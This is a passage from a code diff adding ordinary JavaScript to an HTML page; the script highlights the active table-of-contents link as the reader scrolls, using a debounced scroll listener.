+      if (passedHeadings.length > 0) {
+        newActiveHeading = passedHeadings[passedHeadings.length - 1];
+      } else {
+        newActiveHeading = headings[0];
+      }
+      if (activeHeading != newActiveHeading) {
+        getLinkByHeading(activeHeading).classList.remove(activeClass);
+        activeHeading = newActiveHeading;
+        getLinkByHeading(activeHeading).classList.add(activeClass);
+      }
+    }
+
+    let timer = null;
+    const scrollListener = () => {
+      if (timer !== null) {
+        clearTimeout(timer)
+      }
+      timer = setTimeout(onScroll, 50)
+    }
+    window.addEventListener('scroll', scrollListener, false);
+    scrollListeners.push(scrollListener)
+
+    function getLinkByHeading(heading) {
+      const id = encodeURI(heading.getAttribute('id')).toLowerCase();
+      return document.querySelector(`.toc ul li a[href="#${id}"]`);
+    }
+
+    function getOffsetTop(heading) {
+      if (!heading.getClientRects().length) {
+        return 0;
+      }
+      let rect = heading.getBoundingClientRect();
+      return rect.top
+    }
+  })();
+  </script>
+
+</body>
+
+</html>
